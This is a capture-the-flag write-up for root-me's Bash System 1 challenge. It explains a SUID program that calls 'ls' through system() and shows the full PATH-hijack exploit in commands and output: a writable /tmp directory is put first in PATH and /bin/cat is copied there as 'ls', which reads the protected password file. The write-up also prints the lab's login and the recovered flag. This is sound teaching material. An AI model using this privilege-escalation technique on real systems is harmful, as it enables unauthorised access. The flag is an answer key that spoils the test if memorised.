---
title: Bash - System 1 - root-me.org
published: true
---

# [](#intro)Introduction

[Root-me](https://www.root-me.org) is a CTF website that tries to gamify learning topics by giving different types of challenges across many different areas in cybersecurity. This was one of my first contacts with CTFs, back in December 2022. Since I had already solved some of the challenges at that time, I decided to go back to re-solve them, and give them a proper write-up this time (why not?)

The categories on the website are under the challenges tab. In this post, we'll be solving the App Script category's Bash System 1, the very first challenge. Let's jump right into it!

# [](#level-description)Challenge description

Differently from Pwnable, the challenges under Root-me display a 'Statement' and 'Connection information'. The 'Statement', usually composed of the CTF objective, showcases a script to which we need to exploit. The source code is already available even before sshing:

```c
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    int main(void)
    {
        setreuid(geteuid(), geteuid());
        system("ls /challenge/app-script/ch11/.passwd");
        return 0;
    }
```

To connect to the room, we need to SSH or use their WebSSH. I'd much rather use SSH from my local machine, though their WebSSH also works. The command for this challenge is:

`ssh -p 2222 app-script-ch11@challenge02.root-me.org`

and the password is `app-script-ch11`.

# [](#approach)Approach mindset

Although this is a different CTF website, we will use the same approach mindset we have been using so far. This not only helps us to maintain a certain organized step-by-step to solve CTFs, but also actually increases the probability of learning how to engage in any kind of hacking-related topic.

In this CTF, the first thing we can understand by looking at the C code above is that there is probably a file `.passwd` inside `/challenge/app-script/ch11` directory. The code seems to be using `system` to run the `ls` command at the file.

## [](#mindset-step1)Step 1 - Understanding basic concepts

What are the basic concepts in this CTF? Well, in our case here, this will simply be to investigate what the functions used in the above script are for. For that matter, we will need to do a little C programming research.

### setreuid

According to the Linux manual page, this function takes two unsigned integer arguments: the real user id and the effective user id. Put in simple Linux terms, the 'real user id' is who you really are within the system (the one who owns the process); while the 'effective user id' is what the operating system looks at to make a decision whether or not you are allowed to do something.

Here's a break down of what the function does, according to the [Linux manual page](https://man7.org/linux/man-pages/man2/setreuid.2.html):

> Unprivileged processes may only set the effective user ID to the real user ID, the effective user ID, or the saved set-user-ID.
>
> Unprivileged users may only set the real user ID to the real user ID or the effective user ID.
>
> If the real user ID is set (i.e., ruid is not -1) or the effective user ID is set to a value not equal to the previous real user ID, the saved set-user-ID will be set to the new effective user ID.

The two arguments provided by the code are the same: `geteuid()`. According to the Linux manual page:

> geteuid() returns the effective user ID of the calling process.

This basically means that whoever owns the above C script, the code will run it as that owner (and its privileges).

### system

This function passes a command name or program name specified by a string to the host environment. The command processor then executes the passed command and returns after it has been completed.

Linking with the previous function: the code interprets the script/binary owner's privileges and runs the command with those privileges.

## [](#mindset-step2)Step 2 - Understanding the problem

Now that we understand the basic concepts of this CTF script, we are ready to broaden up our view by relating it to the actual CTF. Let's ssh into the machine and take a look around using the `ls -la` command:

```bash
app-script-ch11@challenge02:~$ ls -la
total 36
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root            4096 Sep  5 14:00 ..
-r--------  1 root                    root             775 Dec 10  2021 ._perms
-rw-r-----  1 root                    root              43 Dec 10  2021 .git
-r--------  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
-r--r-----  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
-r--r-----  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
```

followed by this command:

```bash
app-script-ch11@challenge02:~$ whoami && groups app-script-ch11
app-script-ch11
app-script-ch11 : app-script-ch11 users
```

The output of these commands tell us we are part of most files' group, but are not the `app-script-ch1-cracked` user. As a consequence, we are not able to read the contents of `.passwd`, unless we somehow acquire the `app-script-ch11-cracked` user's priveleges.

We can, however, execute the `ch11` binary, with a possible exploitation of the `setreuid` and `system` functions. Note that the binary `ch11` has the SUID bit set, meaning that when running, it'll assume the owner's file effective user id. 

The SUID bit set is a special permission that applies to scripts or applications. If the SUID bit is set, the script/application effective's UID becomes that of the owner of the file, instead of the user running it.

However, this only results in running the `ls` command, which is useless in this case. Ideally, we would want the command inside the `system` function to be `cat`.

The key to solve this problem is to trick the program into thinking it ran `ls` command, but actually runs the `cat` command. There are a few ways we can try to do this, and that's what we will discuss next.

## [](#mindset-step3)Step 3 - Crafting the attack

Let's try to solve the challenge by applying what we've learned so far and putting into test our assumption of tricking the program to run `cat` instead of `ls`. First, let's see where the `ls` command is being run:

```bash
app-script-ch11@challenge02:~$ which ls
/bin/ls
```

followed by the $PATH variable:

```bash
app-script-ch11@challenge02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
```

Ok. This tells us the `ls` command is being run under the `/bin` path. But what if we had another `ls` command referenced in our $PATH variable? If the order of our new `ls` command path comes first then the `/bin` path, then the system will prioritize that path instead.

I doubt we have write permissions in any of these paths, so we might as well find a directory that we can write a maliciously crafted `ls` command AND that this new path is added to our $PATH variable, listed before the `/bin` path.

An usual choice for that is the `/tmp` directory, which usually gives write permissions to any user:

```bash
app-script-ch11@challenge02:~$ mkdir /tmp/cecil-daemon
app-script-ch11@challenge02:~$ cd /tmp/cecil-daemon && ls -la
total 0
drwxr-x---   2 app-script-ch11 app-script-ch11   40 Dec  5 01:17 .
drwxrwx-wt 256 root            root            7220 Dec  5 01:17 ..
```

We successfully created a directory inside `/tmp` and, as we can see, we have write permissions on it. Now, we want to add this new directory to our path variable:

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ export PATH=/tmp/cecil-daemon:$PATH
app-script-ch11@challenge02:/tmp/cecil-daemon$ echo $PATH
/tmp/cecil-daemon:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
```

Amazing! Our new directory `/tmp/cecil-daemon` is now under the $PATH variable, and it is listed before `/bin`. Now, we need to create a binary called `ls` that instead of having the `ls` command, it has the `cat` command. Let's try it out!

## [](#mindset-step4)Step 4 - Solving!

We need to check where the `cat` command is being executed from. This can be achieved by running:

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ which cat
/bin/cat
```

My first attempt to craft a malicious `ls` is by simply copying the `cat` binary from `/bin` to `/tmp/cecil-daemon` under the name of `ls`. This should force the `ls` to always run the `cat` command instead.

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ cp /bin/cat ./ls 
```

As a test, we can run our malicious `ls` to read a file's contents:

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ echo "test" > test.txt
app-script-ch11@challenge02:/tmp/cecil-daemon$ ./ls test.txt
test
```

It seems to be working! Now, let's go back to our home directory and run the binary. If everything was done correctly, we will be able to see the contents of `.passwd`:

```bash
app-script-ch11@challenge02:/tmp/cecil-daemon$ cd - 
/challenge/app-script/ch11
app-script-ch11@challenge02:~$ ./ch11
!oPe96a/.s8d5
```

We did it! Enjoy the feeling of owning and tricking a system!

# [](#conclusions)Conclusion

In this CTF, we learned a bit more about system misconfigurations and misuse of C functions. We started by understanding the core concepts used by the challenge script, then we tackled the problem by understanding how we could exploit it.

After grasping the nature of the CTF, we needed to create an attack vector. In our case, this was possible because we had write permissions in the `/tmp` directory and access to change the $PATH variable to our own gains. By combining these misconfigurations with a little out-of-the-box thinking, we crafted a malicious `ls` command that mimicked the `cat` command - the one we wanted to use.

It's always good practice to understand what's happening before jumping into testing. This approach makes things easier and often clarifies the solution.

Thanks for sticking 'til the end. I hope you learned something new today! And remember, always do your **research!**

<a href="/">Go back</a>
